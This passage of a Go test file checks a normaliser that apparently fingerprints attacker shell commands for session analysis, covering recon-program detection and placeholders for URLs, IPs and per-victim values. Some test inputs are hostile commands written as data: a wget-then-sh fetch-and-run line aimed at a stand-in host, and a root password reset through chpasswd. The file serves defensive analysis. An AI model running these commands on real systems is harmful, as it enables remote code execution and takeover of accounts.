			t.Errorf("NormalizeCommand(%q)\n got %q\nwant %q", tc.in, s, tc.want)
		}
		if p := program(segments([][]string{got})[0]); p != tc.prog {
			t.Errorf("program(%q) = %q, want %q", tc.in, p, tc.prog)
		}
	}
	if !Distinctive([][]string{NormalizeCommand(`if wget http://x/y; then sh y; fi; id; w`)}) {
		t.Error("a real program behind `if` must still count")
	}
}

func programs(s string) []string {
	var out []string
	for _, seg := range segments([][]string{NormalizeCommand(s)}) {
		out = append(out, program(seg))
	}
	return out
}

// A quoted short program name keeps its name in the program slot: markerRe
// turned 'id' and "ls" into the non-recon program <tok>, and "wget" x and
// "curl" x collided (audit M2). Elsewhere a quoted short word is still <tok>.
func TestQuotedProgramKeepsName(t *testing.T) {
	for _, tc := range []struct{ in, want, prog string }{
		{`'id'`, `'id'`, "id"},
		{`"wget" x`, `"wget" x`, "wget"},
		{`sudo 'ps' aux`, `sudo 'ps' aux`, "ps"},
		{`echo 'vT'`, `echo <tok>`, "echo"},
		{`'/tmp/x'`, `'/tmp/<f>'`, "<f>"},
	} {
		got := NormalizeCommand(tc.in)
		if s := strings.Join(got, " "); s != tc.want {
			t.Errorf("NormalizeCommand(%q)\n got %q\nwant %q", tc.in, s, tc.want)
		}
		if p := program(segments([][]string{got})[0]); p != tc.prog {
			t.Errorf("program(%q) = %q, want %q", tc.in, p, tc.prog)
		}
	}
	if Distinctive([][]string{NormalizeCommand(`'id'; "uname" -a; 'w'; 'ls'; 'ps'`)}) {
		t.Error("quoted recon programs made the script Distinctive")
	}
	if EncodeLine(`"wget" x`) == EncodeLine(`"curl" x`) {
		t.Error(`"wget" and "curl" collided`)
	}
}

// URLs, IPs and /tmp paths stop at a backtick, so a command substitution
// keeps its closing backtick (audit M3).
func TestPlaceholdersStopAtBacktick(t *testing.T) {
	for _, tc := range []struct{ in, want string }{
		{"echo `wget http://x/y`", "echo `wget <url>`"},
		{"echo `curl 1.2.3.4/a`", "echo `curl <ip>`"},
		{"echo `cat /tmp/kxq`", "echo `cat /tmp/<f>`"},
	} {
		if got := norm(tc.in); got != tc.want {
			t.Errorf("NormalizeCommand(%q)\n got %q\nwant %q", tc.in, got, tc.want)
		}
	}
	if EncodeLine("echo `wget http://x/y`") == EncodeLine("echo `wget http://x/y") {
		t.Error("the closed and unclosed backtick forms collided")
	}
}

// Quoted text normalises per-victim numbers and hex like whole tokens do
// (spec §1: "in whole tokens and inside quoted strings"), and a real newline
// inside quotes no longer encodes like a typed \n (audit M4).
func TestQuotedTextNormalisation(t *testing.T) {
	for _, tc := range []struct{ in, want string }{
		{`echo "root:123456789" | chpasswd`, `echo "root:<n>" | chpasswd`},
		{`echo "k=deadbeefdeadbeef00 x"`, `echo "k=<hex> x"`},
		{`echo "port 8080 mode 777"`, `echo "port 8080 mode 777"`}, // short numbers stay
		{"echo \"a\nb\"", `echo "a<nl>b"`},
		{"echo \"a\r\nb\"", `echo "a<cr><nl>b"`},
		{`echo "a\nb"`, `echo "a\nb"`},
		{`echo "root\n123456789"`, `echo "root\n<n>"`},
	} {
		if got := norm(tc.in); got != tc.want {
			t.Errorf("NormalizeCommand(%q)\n got %q\nwant %q", tc.in, got, tc.want)
		}
	}
	if EncodeLine(`echo "root:123456789" | chpasswd`) != EncodeLine(`echo "root:987654321" | chpasswd`) {
		t.Error("a per-victim password changed the encoding")
	}
	if EncodeLine("echo \"a\nb\"") == EncodeLine(`echo "a\nb"`) {
		t.Error("a real newline and a typed \\n collided")
	}
	if got := Display(EncodeLine("echo \"a\nb\""), 0); got != `echo "a\nb"` {
		t.Errorf("Display = %q", got)
	}
}
